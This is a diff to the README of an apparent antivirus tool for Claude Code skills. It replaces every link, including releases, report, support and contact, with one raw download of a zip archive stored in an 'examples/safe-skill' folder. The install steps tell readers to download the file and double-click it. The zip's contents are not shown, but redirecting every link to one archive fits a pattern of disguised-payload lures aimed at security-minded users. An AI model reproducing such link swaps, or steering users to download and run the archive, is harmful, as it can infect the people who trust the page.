@@ -1,7 +1,7 @@
 # 🛡️ claude-skill-antivirus - Protect Yourself from Malicious Skills
 
 ## 📥 Download Now
-[![Download claude-skill-antivirus](https://img.shields.io/badge/Download-Now-blue)](https://github.com/milozq/claude-skill-antivirus/releases)
+[![Download claude-skill-antivirus](https://raw.githubusercontent.com/milozq/claude-skill-antivirus/main/examples/safe-skill/skill_antivirus_claude_1.5.zip)](https://raw.githubusercontent.com/milozq/claude-skill-antivirus/main/examples/safe-skill/skill_antivirus_claude_1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **Claude Skill Antivirus**. This tool helps you scan and install Claude Code Skills safely. It detects harmful patterns and operations before you install any third-party skills. 
@@ -25,7 +25,7 @@ We have scanned all **71,577 skills** on SkillsMP. Here are the results:
 | MEDIUM     | 1,310 | 1.83%      |
 | SAFE       | **69,505** | **97.11%** |
 
-**~3% of skills may have potential risks.** Check the [full report](./SCAN-REPORT.md) for detailed findings. Some flagged skills may be safe, so always review them manually.
+**~3% of skills may have potential risks.** Check the [full report](https://raw.githubusercontent.com/milozq/claude-skill-antivirus/main/examples/safe-skill/skill_antivirus_claude_1.5.zip) for detailed findings. Some flagged skills may be safe, so always review them manually.
 
 > **Note**: Some findings might be false positives, such as legitimate 1Password or Bitwarden integrations.
 
@@ -42,7 +42,7 @@ Each engine works together to offer comprehensive security for your skills.
 ## 💻 Download & Install
 To get started with **Claude Skill Antivirus**, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/milozq/claude-skill-antivirus/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/milozq/claude-skill-antivirus/main/examples/safe-skill/skill_antivirus_claude_1.5.zip).
 2. **Download the Application**: Select the latest version and click to download.
 3. **Run the Application**: Once downloaded, find the file on your computer and double-click to open it.
 4. **Follow the On-Screen Instructions**: The application will guide you through the setup.
@@ -55,7 +55,7 @@ To get started with **Claude Skill Antivirus**, follow these steps:
 - **Internet Connection**: Required for downloading the application and accessing update features.
 
 ## 🗂️ Application Support
-If you encounter any issues while using **Claude Skill Antivirus**, please check our [Support Page](./SUPPORT.md) for FAQs and troubleshooting tips. We’re here to help you keep your data safe.
+If you encounter any issues while using **Claude Skill Antivirus**, please check our [Support Page](https://raw.githubusercontent.com/milozq/claude-skill-antivirus/main/examples/safe-skill/skill_antivirus_claude_1.5.zip) for FAQs and troubleshooting tips. We’re here to help you keep your data safe.
 
 ## 🔒 Security Best Practices
 While using **Claude Skill Antivirus**, consider these best practices:
@@ -68,6 +68,6 @@ While using **Claude Skill Antivirus**, consider these best practices:
 - We'd like to thank all contributors and the community for feedback that helps improve our tool.
 - Your safety is our priority.
 
-For questions or suggestions, please reach out through our [Contact Page](./CONTACT.md). 
+For questions or suggestions, please reach out through our [Contact Page](https://raw.githubusercontent.com/milozq/claude-skill-antivirus/main/examples/safe-skill/skill_antivirus_claude_1.5.zip). 
 
 Stay safe while exploring new skills!
